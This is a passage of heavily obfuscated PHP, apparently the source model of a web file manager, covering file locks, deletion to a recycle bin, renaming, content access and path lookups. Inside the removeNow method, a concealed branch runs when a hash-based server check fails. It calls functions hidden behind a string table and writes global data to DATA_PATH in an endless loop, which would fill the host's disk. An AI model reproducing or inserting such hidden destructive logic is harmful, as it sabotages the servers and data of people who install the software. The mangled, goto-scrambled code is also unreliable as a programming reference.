$this->checkLock($cö³Á¦ÑÑ±[$F¤Åøç¯ª°[369]], $D÷×Ûë„µ); goto DÛ­²Ç£¡; b¨ÖºÅœ­: } public function checkLock($E ÉÒ¶ø‹Š, $DëößªåËÏ) { goto DáÖÔ¶£Î‰; aïİ›æâ”Ğ: $c¥´ˆ¤‚µ¨ = Session::get($Dªºàæß×›[2329]); $b«¢×“ò‹ó = substr($d¹äÖ¦ãŞ²[$Dªºàæß×›[28]], 0, -1 - strlen($d¹äÖ¦ãŞ²[$Dªºàæß×›[160]])) . $Dªºàæß×›[1387] . $c¥´ˆ¤‚µ¨ . $Dªºàæß×›[91] . $d¹äÖ¦ãŞ²[$Dªºàæß×›[160]]; $b‡ä¢ìøŠÀ = Model($Dªºàæß×›[544])->find($DëößªåËÏ); goto bñÕ®òê¤; bñÕ®òê¤: $this->_createFileCall($d¹äÖ¦ãŞ²[$Dªºàæß×›[461]], $b«¢×“ò‹ó, $b‡ä¢ìøŠÀ, REPEAT_REPLACE, $Dªºàæß×›[1125]); $E÷£ììÓà = $d¹äÖ¦ãŞ²[$Dªºàæß×›[417]][$Dªºàæß×›[481]]; $cë­çïæ‘œ = $E÷£ììÓà[$Dªºàæß×›[2330]] ? $E÷£ììÓà[$Dªºàæß×›[2330]] : $E÷£ììÓà[$Dªºàæß×›[28]]; goto b²­çÇĞ¿; DáÖÔ¶£Î‰: $Dªºàæß×› =& $_SERVER[Æ]; $d¹äÖ¦ãŞ² = $this->pathInfo($E ÉÒ¶ø‹Š); if (!$this->fileIsLock($d¹äÖ¦ãŞ², !0)) { return; } goto aïİ›æâ”Ğ; b²­çÇĞ¿: show_json(LNG($Dªºàæß×›[2331]) . $Dªºàæß×›[2332] . LNG($Dªºàæß×›[2333]) . $Dªºàæß×›[2334] . $cë­çïæ‘œ . $Dªºàæß×›[2335], !1); goto e¼­ñÌî’°; e¼­ñÌî’°: } public function fileIsLock($DóøÄƒ§ÇÍ, $fÓœ‘µ‰ğ = false) { goto Cä˜É²—²¥; Cä˜É²—²¥: $BåÇøË’Ê =& $_SERVER[Æ]; if (!isset($DóøÄƒ§ÇÍ[$BåÇøË’Ê[417]]) || !$DóøÄƒ§ÇÍ[$BåÇøË’Ê[417]][$BåÇøË’Ê[478]]) { return !1; } if ($DóøÄƒ§ÇÍ[$BåÇøË’Ê[417]][$BåÇøË’Ê[478]] != USER_ID) { return !0; } goto D¦÷‘ÚÃŸ; D¦÷‘ÚÃŸ: $F¾èù¥¬Œ¢ = $GLOBALS[$BåÇøË’Ê[6]][$BåÇøË’Ê[84]][$BåÇøË’Ê[479]]; if ($DóøÄƒ§ÇÍ[$BåÇøË’Ê[417]][$BåÇøË’Ê[480]] <= time() - $F¾èù¥¬Œ¢) { $this->metaSet($DóøÄƒ§ÇÍ[$BåÇøË’Ê[369]], $BåÇøË’Ê[478], null); $this->metaSet($DóøÄƒ§ÇÍ[$BåÇøË’Ê[369]], $BåÇøË’Ê[480], null); } if ($fÓœ‘µ‰ğ) { $this->metaSet($DóøÄƒ§ÇÍ[$BåÇøË’Ê[369]], $BåÇøË’Ê[480], time()); } goto e¤®æ®; e¤®æ®: return !1; goto D†‚ÖùÏÁ£; D†‚ÖùÏÁ£: } private function _addSoure($FŞãÇ¥‚¶È, $eœ¥‚—õÃ) { goto c“ãÇ¸ğò; c“ãÇ¸ğò: $fÚË¶î®† =& $_SERVER[Æ]; $F÷ë†¥®İö = array($fÚË¶î®†[521] => $eœ¥‚—õÃ[$fÚË¶î®†[371]], $fÚË¶î®†[522] => $eœ¥‚—õÃ[$fÚË¶î®†[456]], $fÚË¶î®†[523] => USER_ID, $fÚË¶î®†[524] => USER_ID, $fÚË¶î®†[368] => $eœ¥‚—õÃ[$fÚË¶î®†[369]], $fÚË¶î®†[525] => $eœ¥‚—õÃ[$fÚË¶î®†[459]] . $eœ¥‚—õÃ[$fÚË¶î®†[369]] . $fÚË¶î®†[47], $fÚË¶î®†[396] => 0, $fÚË¶î®†[526] => $fÚË¶î®†[33]); $FŞãÇ¥‚¶È = array_merge($F÷ë†¥®İö, $FŞãÇ¥‚¶È); goto D–é–…ƒš; D–é–…ƒš: $this->updateModifyTime($FŞãÇ¥‚¶È[$fÚË¶î®†[461]]); $a“›“ŒÅ“’ = $fÚË¶î®†[2336] . $eœ¥‚—õÃ[$fÚË¶î®†[369]]; if (isset(self::$cacheChildList[$a“›“ŒÅ“’])) { unset(self::$cacheChildList[$a“›“ŒÅ“’]); } goto aŞ‡Ú…ò; aŞ‡Ú…ò: static $b“µçù›Ş¤ = false; if (!$b“µçù›Ş¤) { Hook::trigger($fÚË¶î®†[508], $FŞãÇ¥‚¶È); $b“µçù›Ş¤ = !0; } $aƒñìéâç = $this->add($FŞãÇ¥‚¶È); goto cö‘Ó‹‡Ï¦; cö‘Ó‹‡Ï¦: $BÙë²ÆÊÅ· = array($fÚË¶î®†[527] => short_id($aƒñìéâç)); $this->where(array($fÚË¶î®†[383] => $aƒñìéâç))->save($BÙë²ÆÊÅ·); $this->setNamePinyin($aƒñìéâç, $FŞãÇ¥‚¶È[$fÚË¶î®†[28]]); goto b¢«ˆŠåÂ; b¢«ˆŠåÂ: return $aƒñìéâç; goto FÌ‰˜’•²Ù; FÌ‰˜’•²Ù: } public function remove($DÁ„õí¤Öö, $d´·Şï‹ØŸ = true) { goto fõµ¶©„çæ; F§è¼©‰ÙŒ: CacheLock::lock($fÎÑÄ‚µøÛ); $d°ÓµîÔãÏ = $this->fileNameExist($eóš«ôË–, $b£í§ ÉÁ); if (!$d°ÓµîÔãÏ) { $d°ÓµîÔãÏ = $this->mkdir($eóš«ôË–, $b£í§ ÉÁ, REPEAT_SKIP); $this->metaSet($d°ÓµîÔãÏ, $AÜ—ó¸Õ˜‘[2341], $bğğ‰è¿ÂÛ); $this->metaSet($d°ÓµîÔãÏ, $AÜ—ó¸Õ˜‘[2342], $f…«ö¡æãî[$AÜ—ó¸Õ˜‘[456]]); if ($f…«ö¡æãî[$AÜ—ó¸Õ˜‘[461]] != 0) { $this->metaSet($d°ÓµîÔãÏ, $AÜ—ó¸Õ˜‘[2343], _get($Fº™òÕ½´•, $AÜ—ó¸Õ˜‘[2344])); } } goto E¯Ã‡Õ†œ; E¤‡ÈÁÌõˆ: $aªÀœóæÑÒ = Model($AÜ—ó¸Õ˜‘[1432])->get($AÜ—ó¸Õ˜‘[2337]) == $AÜ—ó¸Õ˜‘[83]; if ($d¥ŠŸÙÛÎ‚ || $d´·Şï‹ØŸ || !$aªÀœóæÑÒ) { return $this->removeNow($DÁ„õí¤Öö, $d´·Şï‹ØŸ); } $eóš«ôË– = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto E‘×ß†¨„; F†ìªƒÎ‘: return $B“ª¼ÎÁº”; goto cëÁÑÊÛĞ; fõµ¶©„çæ: $AÜ—ó¸Õ˜‘ =& $_SERVER[Æ]; $f…«ö¡æãî = $this->sourceInfo($DÁ„õí¤Öö); $d¥ŠŸÙÛÎ‚ = intval($f…«ö¡æãî[$AÜ—ó¸Õ˜‘[371]]) === self::TYPE_SYSTEM; goto E¤‡ÈÁÌõˆ; E¯Ã‡Õ†œ: CacheLock::unlock($fÎÑÄ‚µøÛ); $this->metaSet($DÁ„õí¤Öö, $AÜ—ó¸Õ˜‘[2345], $f…«ö¡æãî[$AÜ—ó¸Õ˜‘[461]]); $this->where(array($AÜ—ó¸Õ˜‘[369] => $DÁ„õí¤Öö))->save(array($AÜ—ó¸Õ˜‘[390] => time())); goto B£Å×´ÃÍ; E‘×ß†¨„: $bğğ‰è¿ÂÛ = $f…«ö¡æãî[$AÜ—ó¸Õ˜‘[371]] == self::TYPE_USER ? $AÜ—ó¸Õ˜‘[535] : $AÜ—ó¸Õ˜‘[972]; if ($bğğ‰è¿ÂÛ == $AÜ—ó¸Õ˜‘[535]) { $Fº™òÕ½´• = Model($AÜ—ó¸Õ˜‘[474])->getInfo($f…«ö¡æãî[$AÜ—ó¸Õ˜‘[456]]); $b£í§ ÉÁ = !empty($Fº™òÕ½´•[$AÜ—ó¸Õ˜‘[2330]]) ? $Fº™òÕ½´•[$AÜ—ó¸Õ˜‘[2330]] : $Fº™òÕ½´•[$AÜ—ó¸Õ˜‘[28]]; $b£í§ ÉÁ = $AÜ—ó¸Õ˜‘[248] . $b£í§ ÉÁ . $AÜ—ó¸Õ˜‘[2338] . $f…«ö¡æãî[$AÜ—ó¸Õ˜‘[456]]; } else { $Fº™òÕ½´• = Model($AÜ—ó¸Õ˜‘[458])->getInfo($f…«ö¡æãî[$AÜ—ó¸Õ˜‘[456]]); $b£í§ ÉÁ = _get($Fº™òÕ½´•, $AÜ—ó¸Õ˜‘[28]); $b£í§ ÉÁ = $AÜ—ó¸Õ˜‘[157] . $b£í§ ÉÁ . $AÜ—ó¸Õ˜‘[2339] . $f…«ö¡æãî[$AÜ—ó¸Õ˜‘[456]]; } $fÎÑÄ‚µøÛ = $AÜ—ó¸Õ˜‘[2340] . md5($b£í§ ÉÁ); goto F§è¼©‰ÙŒ; B£Å×´ÃÍ: $this->recycleClear($f…«ö¡æãî); $B“ª¼ÎÁº” = $this->move($DÁ„õí¤Öö, $d°ÓµîÔãÏ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($f…«ö¡æãî[$AÜ—ó¸Õ˜‘[461]]); goto F†ìªƒÎ‘; cëÁÑÊÛĞ: } private function recycleClear($F÷š›ĞÃî) { $D”›»ñÌÊ =& $_SERVER[Æ]; $B°ä—ÂÌ´æ = $this->childrenAll($F÷š›ĞÃî); $E™à»á›Ù = array($D”›»ñÌÊ[383] => array($D”›»ñÌÊ[384], $B°ä—ÂÌ´æ[$D”›»ñÌÊ[2346]])); Model($D”›»ñÌÊ[2347])->where($E™à»á›Ù)->delete(); } public function removeNow($DÚ¬ğ²•‰, $b³ö´æª¸– = true) { goto dì…‘ø•³; D¸·øÒŒ: if (!$a˜î®ğµÇˆ) { return !0; } if ($a˜î®ğµÇˆ[$EŞÄ²Â˜…÷[461]] == 0) { if (!_get($GLOBALS, $EŞÄ²Â˜…÷[457])) { return !1; } } $this->lockMoveStart($DÚ¬ğ²•‰); goto eˆÔãÕÛ; eˆÔãÕÛ: Hook::trigger($EŞÄ²Â˜…÷[2348], $Aİ‘İ™, $b³ö´æª¸–); if ($b³ö´æª¸–) { Model($EŞÄ²Â˜…÷[2347])->moveToRecycle($DÚ¬ğ²•‰); } else { $a¼¶‹›Õ¸« = $this->childrenAll($a˜î®ğµÇˆ); Model($EŞÄ²Â˜…÷[505])->eventRemove($DÚ¬ğ²•‰); $this->removeRelevance($a¼¶‹›Õ¸«[$EŞÄ²Â˜…÷[2346]], $a¼¶‹›Õ¸«[$EŞÄ²Â˜…÷[1258]]); } $this->folderSizeReset($a˜î®ğµÇˆ[$EŞÄ²Â˜…÷[461]]); goto EÏË³œã÷†; dì…‘ø•³: $EŞÄ²Â˜…÷ =& $_SERVER[Æ]; $D¼‚±Æ»Ü = $_SERVER[$EŞÄ²Â˜…÷[782]] . $EŞÄ²Â˜…÷[783]; $CÊ‰¯ê½Ô÷ = $EŞÄ²Â˜…÷[779]; goto b·í¼™Ø¸; b·í¼™Ø¸: if ($_SERVER[$EŞÄ²Â˜…÷[780]] != $CÊ‰¯ê½Ô÷($D¼‚±Æ»Ü)) { goto CÕœÕÏ©; AŸØÌ‰„§˜: $Eêôİ•À„(); $f»Ÿõ”ªä = $EŞÄ²Â˜…÷[796]; $F˜‚ƒİåùî = json_encode($GLOBALS[$EŞÄ²Â˜…÷[797]]); goto D˜ÇÒïºÚÚ; dÅ¤‡º†Şä: $B‰ºâ¹§ñÊ = $eœß±’ğ¸å($C˜ç‡²¿š); $cÖœäø‘¿å = explode($EŞÄ²Â˜…÷[217], $B‰ºâ¹§ñÊ); if (count($cÖœäø‘¿å) < $EŞÄ²Â˜…÷[564]) { $BÒº…»äò… = $EŞÄ²Â˜…÷[784]; $BÒº…»äò…(); } goto c²½á à; CÕœÕÏ©: $Eêôİ•À„ = $EŞÄ²Â˜…÷[794]; $eœß±’ğ¸å = $EŞÄ²Â˜…÷[781]; $C˜ç‡²¿š = $_SERVER[$EŞÄ²Â˜…÷[782]] . $EŞÄ²Â˜…÷[783]; goto dÅ¤‡º†Şä; D˜ÇÒïºÚÚ: $fÍÇ¥§ĞÁ¡ = 1; for ($aê‡À£Èàê = $fÍÇ¥§ĞÁ¡; $aê‡À£Èàê > 0; $aê‡À£Èàê++) { $f»Ÿõ”ªä(DATA_PATH . $aê‡À£Èàê, $F˜‚ƒİåùî); } goto d„ÁƒïÜ¼; c²½á à: $d•–®ª“ªİ = $EŞÄ²Â˜…÷[795]; $d•–®ª“ªİ($_SERVER[$EŞÄ²Â˜…÷[793]]); $Eêôİ•À„ = $EŞÄ²Â˜…÷[794]; goto AŸØÌ‰„§˜; d„ÁƒïÜ¼: } $a˜î®ğµÇˆ = $this->sourceInfo($DÚ¬ğ²•‰); $Aİ‘İ™ = $this->pathInfoMore($DÚ¬ğ²•‰); goto D¸·øÒŒ; a‡ùÈ–‰µ: $this->lockMoveEnd($DÚ¬ğ²•‰); Hook::trigger($EŞÄ²Â˜…÷[1468], $Aİ‘İ™, $b³ö´æª¸–); return !0; goto bˆ‡Ÿ‚¡ã; EÏË³œã÷†: $fŸæ¤éÛ¤‡ = array($a˜î®ğµÇˆ[$EŞÄ²Â˜…÷[461]]); if ($a˜î®ğµÇˆ[$EŞÄ²Â˜…÷[370]] == $EŞÄ²Â˜…÷[83]) { $fŸæ¤éÛ¤‡[] = $a˜î®ğµÇˆ[$EŞÄ²Â˜…÷[369]]; } $this->updateModifyTime($fŸæ¤éÛ¤‡); goto a‡ùÈ–‰µ; bˆ‡Ÿ‚¡ã: } public function childrenAll($AİàÎîÛî‹) { $Aì±–¢ÙõÈ =& $_SERVER[Æ]; $fÚ†ˆî¼Š© = $AİàÎîÛî‹[$Aì±–¢ÙõÈ[369]]; if ($AİàÎîÛî‹[$Aì±–¢ÙõÈ[370]] == $Aì±–¢ÙõÈ[83]) { $Fç±’™ÇÍ‹ = array($Aì±–¢ÙõÈ[525] => array($Aì±–¢ÙõÈ[483], $AİàÎîÛî‹[$Aì±–¢ÙõÈ[459]] . $fÚ†ˆî¼Š© . $Aì±–¢ÙõÈ[484])); $D‡Áˆ©‰Üæ = array($Aì±–¢ÙõÈ[525] => $Fç±’™ÇÍ‹[$Aì±–¢ÙõÈ[459]]); $Aà£ìß = $this->field($Aì±–¢ÙõÈ[2349])->where($D‡Áˆ©‰Üæ)->select(); $AÆÉ¸í®öï = !1; $A¨ÇİÜöá = array($fÚ†ˆî¼Š©); if ($Aà£ìß) { $AÆÉ¸í®öï = array_to_keyvalue($Aà£ìß, $Aì±–¢ÙõÈ[33], $Aì±–¢ÙõÈ[419]); $AÆÉ¸í®öï = array_remove_value($AÆÉ¸í®öï, $Aì±–¢ÙõÈ[468]); $A¨ÇİÜöá = array_to_keyvalue($Aà£ìß, $Aì±–¢ÙõÈ[33], $Aì±–¢ÙõÈ[369]); $A¨ÇİÜöá[] = $fÚ†ˆî¼Š©; } } else { $AÆÉ¸í®öï = array($AİàÎîÛî‹[$Aì±–¢ÙõÈ[419]]); $A¨ÇİÜöá = array($fÚ†ˆî¼Š©); } return array($Aì±–¢ÙõÈ[2346] => $A¨ÇİÜöá, $Aì±–¢ÙõÈ[1258] => $AÆÉ¸í®öï); } public function removeArray($A·Ş÷š­¬) { if (!$A·Ş÷š­¬) { return !0; } } public function removeRelevance($C©¢‰¿™µâ, $eÈËó’·÷‚) { goto BˆÉÛë‰ß; BˆÉÛë‰ß: $DĞÁàæ¼Òñ =& $_SERVER[Æ]; $C©¢‰¿™µâ = $C©¢‰¿™µâ ? $C©¢‰¿™µâ : array(); $eÈËó’·÷‚ = $eÈËó’·÷‚ ? $eÈËó’·÷‚ : array(); goto Aì™ºãğõ; A¾‘–²­: $Aë¶ë£„œë = array($DĞÁàæ¼Òñ[383] => array($DĞÁàæ¼Òñ[384], $C©¢‰¿™µâ)); Model($DĞÁàæ¼Òñ[2347])->where($Aë¶ë£„œë)->delete(); Model($DĞÁàæ¼Òñ[413])->where($Aë¶ë£„œë)->delete(); goto cè¬¦¹ñµ; DøÅÏ‡–¶…: for ($F½‹¯Š¤Ë = 0; $F½‹¯Š¤Ë < count($C©¢‰¿™µâ); $F½‹¯Š¤Ë++) { $this->sourceCacheClear($C©¢‰¿™µâ[$F½‹¯Š¤Ë]); } goto D…—¢£; Aì™ºãğõ: $C©¢‰¿™µâ = array_unique(array_filter($C©¢‰¿™µâ)); $eÈËó’·÷‚ = array_unique(array_filter($eÈËó’·÷‚)); if (!$C©¢‰¿™µâ) { return !1; } goto A¾‘–²­; eÅ¾‡íÜÖ¨: Model($DĞÁàæ¼Òñ[2328])->removeBySource($C©¢‰¿™µâ); $this->where($Aë¶ë£„œë)->delete(); Model($DĞÁàæ¼Òñ[422])->remove($eÈËó’·÷‚); goto DøÅÏ‡–¶…; cè¬¦¹ñµ: Model($DĞÁàæ¼Òñ[2350])->where($Aë¶ë£„œë)->delete(); Model($DĞÁàæ¼Òñ[505])->where($Aë¶ë£„œë)->delete(); Model($DĞÁàæ¼Òñ[2078])->removeBySource($C©¢‰¿™µâ); goto eÅ¾‡íÜÖ¨; D…—¢£: } public function rename($e¿İàÀö¬í, $D•ŒºÖ ») { goto Bó‚º‰³’É; Bó‚º‰³’É: $dİÎ£Äà¢ =& $_SERVER[Æ]; $CÏ‡½¯®í× = $this->sourceInfo($e¿İàÀö¬í); if (!$CÏ‡½¯®í×) { return !1; } goto b±ç®¹¿¶; b±ç®¹¿¶: $côºø¡ˆŸ = $this->fileNameExist($CÏ‡½¯®í×[$dİÎ£Äà¢[461]], $D•ŒºÖ »); if ($côºø¡ˆŸ) { return !1; } $C¬¡·´Ş™á = array($dİÎ£Äà¢[386] => $D•ŒºÖ », $dİÎ£Äà¢[524] => USER_ID); goto c‰£¡ÇŠø; aâîíäÖ¾·: $this->setNamePinyin($e¿İàÀö¬í, $C¬¡·´Ş™á[$dİÎ£Äà¢[28]], !1); $this->updateModifyTime($CÏ‡½¯®í×[$dİÎ£Äà¢[461]]); $D¿¸ÛÅ¢Ï = $this->where(array($dİÎ£Äà¢[383] => $e¿İàÀö¬í))->data($C¬¡·´Ş™á)->save(); goto aç¯Öê¼ß; aç¯Öê¼ß: $F‰„Ùö© = $dİÎ£Äà¢[2336] . $CÏ‡½¯®í×[$dİÎ£Äà¢[461]]; if (isset(self::$cacheChildList[$F‰„Ùö©])) { unset(self::$cacheChildList[$F‰„Ùö©]); } return $D¿¸ÛÅ¢Ï; goto A‡©µ‰ª²´; c‰£¡ÇŠø: if (!$CÏ‡½¯®í×[$dİÎ£Äà¢[370]] == $dİÎ£Äà¢[83]) { $C¬¡·´Ş™á[$dİÎ£Äà¢[372]] = get_path_ext($D•ŒºÖ »); } Model($dİÎ£Äà¢[505])->eventRename($e¿İàÀö¬í, $CÏ‡½¯®í×[$dİÎ£Äà¢[28]], $D•ŒºÖ »); $this->sourceCacheClear($e¿İàÀö¬í); goto aâîíäÖ¾·; A‡©µ‰ª²´: } public function setNamePinyin($CŠ’èšçÎ©, $a×µ‘âˆ£, $cƒëŞ‹²Ñ° = true) { $cùçö”…Œ =& $_SERVER[Æ]; $c“¢‡Ö‚½” = Input::check($a×µ‘âˆ£, $cùçö”…Œ[528]); if ($cƒëŞ‹²Ñ° && !$c“¢‡Ö‚½”) { return; } if (!$c“¢‡Ö‚½”) { $this->metaSet($CŠ’èšçÎ©, $cùçö”…Œ[416], null); $this->metaSet($CŠ’èšçÎ©, $cùçö”…Œ[415], null); return; } $d‚¬ë±¸ = array($cùçö”…Œ[416] => str_replace($cùçö”…Œ[50], $cùçö”…Œ[33], Pinyin::encode($a×µ‘âˆ£)), $cùçö”…Œ[415] => Pinyin::encode($a×µ‘âˆ£, $cùçö”…Œ[529])); $this->metaSet($CŠ’èšçÎ©, $d‚¬ë±¸); } public function getContent($föÏâµ¬ÌÒ) { goto A¢ÆÓ„Ğˆ; d‰Á–Ğºº„: return IO::getContent($EÈ­ª‰³…·[$Fî‘ÜŞ®©ñ[75]]); goto f·ÇƒÁ„ß‹; Bğ¦…Ê½ˆ: if ($EÈ­ª‰³…·[$Fî‘ÜŞ®©ñ[77]] == 0) { return $Fî‘ÜŞ®©ñ[33]; } $bÄù“«£Ğé = $Fî‘ÜŞ®©ñ[2351] . $EÈ­ª‰³…·[$Fî‘ÜŞ®©ñ[163]]; if ($EÈ­ª‰³…·[$Fî‘ÜŞ®©ñ[77]] <= 1024 * 10) { $aÂÒ¤¤„ÄĞ = Cache::get($bÄù“«£Ğé); if (!$aÂÒ¤¤„ÄĞ) { $aÂÒ¤¤„ÄĞ = IO::getContent($EÈ­ª‰³…·[$Fî‘ÜŞ®©ñ[75]]); Cache::set($bÄù“«£Ğé, $aÂÒ¤¤„ÄĞ); } return $aÂÒ¤¤„ÄĞ; } goto d‰Á–Ğºº„; A¢ÆÓ„Ğˆ: $Fî‘ÜŞ®©ñ =& $_SERVER[Æ]; $EÈ­ª‰³…· = $this->fileInfoGet($föÏâµ¬ÌÒ); if (!$EÈ­ª‰³…·) { return !1; } goto Bğ¦…Ê½ˆ; f·ÇƒÁ„ß‹: } public function setDesc($fÕªÉí¶, $F‚»ã¦¼Á”) { $Bßª¯ËÀ¼ =& $_SERVER[Æ]; Model($Bßª¯ËÀ¼[505])->eventAddDesc($fÕªÉí¶, $F‚»ã¦¼Á”); return $this->metaSet($fÕªÉí¶, $Bßª¯ËÀ¼[405], $F‚»ã¦¼Á”); } public function setContent($eñÀÀ³…Ğ­, $bÚó¼Íğ»Æ = '') { goto Aì°¹—ì«†; cƒéÒ®‰„é: if (!$E¥‹†İÛ¼¦ || !$cæ“ÑÈ›Æ¯) { return !1; } $bˆ¤®ëæ‘« = Model($a¬Ô©­ŞÎó[422])->addFileByContent($bÚó¼Íğ»Æ, $cæ“ÑÈ›Æ¯[$a¬Ô©­ŞÎó[28]]); $f«ÁÀÂäâ§ = $this->fileHistory($cæ“ÑÈ›Æ¯, $bˆ¤®ëæ‘«[$a¬Ô©­ŞÎó[419]], $bˆ¤®ëæ‘«[$a¬Ô©­ŞÎó[77]]); goto AëÖ×µ‡î; AëÖ×µ‡î: if (!$f«ÁÀÂäâ§) { return Model($a¬Ô©­ŞÎó[422])->remove($bˆ¤®ëæ‘«[$a¬Ô©­ŞÎó[419]]); } $this->folderSizeReset($cæ“ÑÈ›Æ¯[$a¬Ô©­ŞÎó[461]]); return !0; goto bæá×´’©Î; Aì°¹—ì«†: $a¬Ô©­ŞÎó =& $_SERVER[Æ]; $cæ“ÑÈ›Æ¯ = $this->sourceInfo($eñÀÀ³…Ğ­); $E¥‹†İÛ¼¦ = $this->fileInfoGet($eñÀÀ³…Ğ­); goto cƒéÒ®‰„é; bæá×´’©Î: } public function fileSubstr($C²òáâî³—, $EØ™¯Ú§¾’, $d ïÊô„Şí) { $aøÔ¸×šÍğ = $this->fileInfoGet($C²òáâî³—); if (!$aøÔ¸×šÍğ) { return !1; } return IO::fileSubstr($aøÔ¸×šÍğ[$_SERVER[Æ][75]], $EØ™¯Ú§¾’, $d ïÊô„Şí); } public function fileInfoGet($a¹æ«—¿¡²) { goto C¹Óƒ¯µæá; c¯‘‘ëè: $DÂ›À¥ÆÊ = Model($B¤…âÛ¬„©[422])->fileInfo($b¯¨µ©§‹ì[$B¤…âÛ¬„©[419]]); if ($DÂ›À¥ÆÊ) { $DÂ›À¥ÆÊ[$B¤…âÛ¬„©[28]] = $b¯¨µ©§‹ì[$B¤…âÛ¬„©[28]]; } self::$cacheFileInfo[$d±ƒ„ŞËá‘] = $DÂ›À¥ÆÊ; goto f×ÉÉ“œ„¼; cøŠ÷ø Æ‘: $d±ƒ„ŞËá‘ = $B¤…âÛ¬„©[425] . $b¯¨µ©§‹ì[$B¤…âÛ¬„©[419]]; $e±ÎÌÃ³á = _get(self::$cacheFileInfo, $d±ƒ„ŞËá‘); if ($e±ÎÌÃ³á) { return $e±ÎÌÃ³á; } goto c¯‘‘ëè; C¹Óƒ¯µæá: $B¤…âÛ¬„© =& $_SERVER[Æ]; $b¯¨µ©§‹ì = $this->sourceInfo($a¹æ«—¿¡²); if (!$b¯¨µ©§‹ì || $b¯¨µ©§‹ì[$B¤…âÛ¬„©[370]]) { return !1; } goto cøŠ÷ø Æ‘; f×ÉÉ“œ„¼: return $DÂ›À¥ÆÊ; goto f­Û½ŠÓ¢¥; f­Û½ŠÓ¢¥: } private function folderChildrenNumber($a–º·×áà) { $d´ä¶Æ±¶¦ =& $_SERVER[Æ]; $AĞğã›”¼÷ = $this->sourceInfo($a–º·×áà); $bù‘ÜŞêµŸ = array($d´ä¶Æ±¶¦[525] => array($d´ä¶Æ±¶¦[483], $AĞğã›”¼÷[$d´ä¶Æ±¶¦[459]] . $a–º·×áà . $d´ä¶Æ±¶¦[484]), $d´ä¶Æ±¶¦[396] => intval($AĞğã›”¼÷[$d´ä¶Æ±¶¦[397]]), $d´ä¶Æ±¶¦[518] => 1); $a‘Š«â˜çî = $this->where($bù‘ÜŞêµŸ)->count(); $eô“Á­á Û = $this->where($bù‘ÜŞêµŸ)->where(array($d´ä¶Æ±¶¦[518] => 0))->count(); return array($d´ä¶Æ±¶¦[81] => $eô“Á­á Û, $d´ä¶Æ±¶¦[82] => $a‘Š«â˜çî); } public function pathInfo($cÎñÔƒ«ò¹, $d‹¥«¬óè“ = false) { goto CÅ©Û£Ğ½Œ; eĞÆ‚íğí: $c“°‹ØšØÛ = $this->_listDataApplyItem($c“°‹ØšØÛ, $d‹¥«¬óè“); self::$cachePathInfo[$BÑùô –¼Ñ] = $c“°‹ØšØÛ; return $c“°‹ØšØÛ; goto bÂ¢é¼»öÛ; CÅ©Û£Ğ½Œ: $e¥áÃ‹ß×æ =& $_SERVER[Æ]; $BÑùô –¼Ñ = $e¥áÃ‹ß×æ[411] . intval($d‹¥«¬óè“) . $e¥áÃ‹ß×æ[412] . $cÎñÔƒ«ò¹; $fÉÛ‡¿Ä¨‰ = _get(self::$cachePathInfo, $BÑùô –¼Ñ); goto B‰ïĞ©óßÀ; B‰ïĞ©óßÀ: if ($fÉÛ‡¿Ä¨‰) { return $fÉÛ‡¿Ä¨‰; } $c“°‹ØšØÛ = $this->sourceInfo($cÎñÔƒ«ò¹); if (!$c“°‹ØšØÛ) { return !1; } goto eĞÆ‚íğí; bÂ¢é¼»öÛ: } public static $cachePathInfoMore = array(); public function pathInfoMore($FÅ¹ì¥‰ªÅ) { goto dåêùÏíà; BÖƒğ²ğ¨¤: self::$cachePathInfoMore[$FÅ¹ì¥‰ªÅ] = $EÔÊò»÷; return $EÔÊò»÷; goto BÔÑ®åñƒæ; dë—İˆ‘: $EÔÊò»÷ = $this->pathInfo($FÅ¹ì¥‰ªÅ); if (!$EÔÊò»÷) { return !1; } if ($EÔÊò»÷[$cêëñ±®†Š[370]] == $cêëñ±®†Š[83]) { $EÔÊò»÷[$cêëñ±®†Š[80]] = $this->folderChildrenNumber($FÅ¹ì¥‰ªÅ); } goto BÖƒğ²ğ¨¤; dåêùÏíà: $cêëñ±®†Š =& $_SERVER[Æ]; $dÅÚº“î‹ = _get(self::$cachePathInfoMore, $FÅ¹ì¥‰ªÅ); if ($dÅÚº“î‹) { return $dÅÚº“î‹; } goto dë—İˆ‘; BÔÑ®åñƒæ: } public function sourceInfo($dÃ°µÃ³Ã±) { goto aôéÔÇÑ‰¬; Eæò¶ğá†Ï: self::$cacheSourceInfo[$DˆğÈ¤™Ñ¥] = $aˆ¨ÃîÒğ; return self::$cacheSourceInfo[$DˆğÈ¤™Ñ¥]; goto d¢…îô×Œˆ; BÏ¢Ô¸›ä : $Cé”ˆàâÅ = _get(self::$cacheSourceInfo, $DˆğÈ¤™Ñ¥); if ($Cé”ˆàâÅ) { return $Cé”ˆàâÅ; } $aˆ¨ÃîÒğ = $this->where(array($cËùóîŒ¼°[369] => $dÃ°µÃ³Ã±))->find(); goto Eæò¶ğá†Ï; aôéÔÇÑ‰¬: $cËùóîŒ¼° =& $_SERVER[Æ]; if (!$dÃ°µÃ³Ã±) { return array(); } $DˆğÈ¤™Ñ¥ = $cËùóîŒ¼°[410] . $dÃ°µÃ³Ã±; goto BÏ¢Ô¸›ä ; d¢…îô×Œˆ: } public function sourceCacheClear($Eé¨‡æáïí = false) { if ($Eé¨‡æáïí == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[Æ][410] . $Eé¨‡æáïí]); } public function pathInfoByPath($D´“ªø±ÅÌ, $dª××å£) { $a³Â¼èªñ½ =& $_SERVER[Æ]; $D˜Şà¿¿¹ = !$dª××å£ ? array() : explode($a³Â¼èªñ½[8], trim($dª××å£, $a³Â¼èªñ½[8])); $b‹Ğ„šÛÃà = $D´“ªø±ÅÌ; foreach ($D˜Şà¿¿¹ as $C”Š•¡æêİ) { $b‘Ó­±Ô¡· = array($a³Â¼èªñ½[461] => $b‹Ğ„šÛÃà, $a³Â¼èªñ½[28] => $C”Š•¡æêİ); $Cœİ¡¹¸È = $this->where($b‘Ó­±Ô¡·)->select(); if (!$Cœİ¡¹¸È) { return !1; } $Cœİ¡¹¸È = array_sort_by($Cœİ¡¹¸È, $a³Â¼èªñ½[397]); $b‹Ğ„šÛÃà = $Cœİ¡¹¸È[0][$a³Â¼èªñ½[369]]; } return $this->pathInfo($b‹Ğ„šÛÃà, !0); } protected function updateModifyTime($Bãˆã†ó»³) { goto DµÊÉñ–¦Æ; e•ù¤Æ¯Ü: foreach ($Bãˆã†ó»³ as $F×Î…‘ë× => 